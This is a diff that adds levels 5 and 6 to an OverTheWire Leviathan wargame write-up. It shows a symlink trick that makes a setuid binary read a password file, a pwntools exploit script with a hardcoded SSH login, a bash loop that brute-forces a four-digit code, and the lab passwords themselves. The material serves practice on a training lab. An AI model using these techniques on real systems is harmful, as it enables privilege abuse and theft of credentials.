@@ -440,4 +440,106 @@ log.success('Password for next level -> ' + sh.recvline().decode("utf-8"))
 
 ## Level 5
 
+Let's connect to level 5:
 
+```
+$ ssh leviathan5@leviathan.labs.overthewire.org -p 2223
+leviathan5@leviathan:~$ 
+```
+
+We can see a binary:
+
+```
+leviathan5@leviathan:~$ file leviathan5 
+leviathan5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=414fe0634bbd08f446816d4da55ea9a43484fc35, not stripped
+```
+
+Let's execute it:
+
+```
+leviathan5@leviathan:~$ ./leviathan5 
+Cannot find /tmp/file.log
+```
+
+It reads the `/tmp/file.log` let's create and execute it.
+
+```
+leviathan5@leviathan:~$ touch /tmp/file.log; ./leviathan5
+```
+
+Does nothing, here we will do a trick. We will create a symbolic link (a file that points to another file).
+
+```
+leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log; ./leviathan5 
+UgaoFee4li
+```
+
+My pwntools exploit:
+
+```python
+#!/usr/bin/env python3
+#context.log_level = 'debug'
+
+from pwn import *
+
+log.info('leviathan series pwntools exploit by atom')
+shell = ssh('leviathan5', 'leviathan.labs.overthewire.org', password='Tith4cokei', port=2223)
+sh = shell.run('sh')
+sh.sendline('ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log; ./leviathan5')
+log.success('Password for next level -> ' + sh.recvline().decode("utf-8"))
+```
+
+```
+$ ./exp.py   
+[*] leviathan series pwntools exploit by atom
+[+] Connecting to leviathan.labs.overthewire.org on port 2223: Done
+[*] leviathan2@leviathan.labs.overthewire.org:
+    Distro    Devuan 2.0
+    OS:       linux
+    Arch:     amd64
+    Version:  4.18.12
+    ASLR:     Disabled
+[+] Opening new channel: 'sh': Done
+[+] Password for next level -> $ UgaoFee4li
+```
+
+## Level 6
+
+Let's connect to level 6:
+
+```
+$ ssh leviathan6@leviathan.labs.overthewire.org -p 2223
+leviathan6@leviathan:~$
+```
+
+We can see a binary:
+
+```
+leviathan6@leviathan:~$ file leviathan6 
+leviathan6: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=30bfe37691e013d638a271635abbb3ade6b5d20b, not stripped
+```
+
+Let's execute it:
+
+```
+leviathan6@leviathan:~$ ./leviathan6 
+usage: ./leviathan6 <4 digit code>
+```
+
+Need a 4digits code, so 0000-9999. I coded a simple bash one-liner to do brute force.
+
+```bash
+for data in {0000..9999}; do echo "Try -> $data" ; ./leviathan6 $data; done
+```
+
+After some minutes:
+
+```
+Try -> 7123
+$ whoami
+leviathan7
+$ cat /etc/leviathan_pass/leviathan7
+ahy7MaeBo9
+```
+
+Was fun! :)
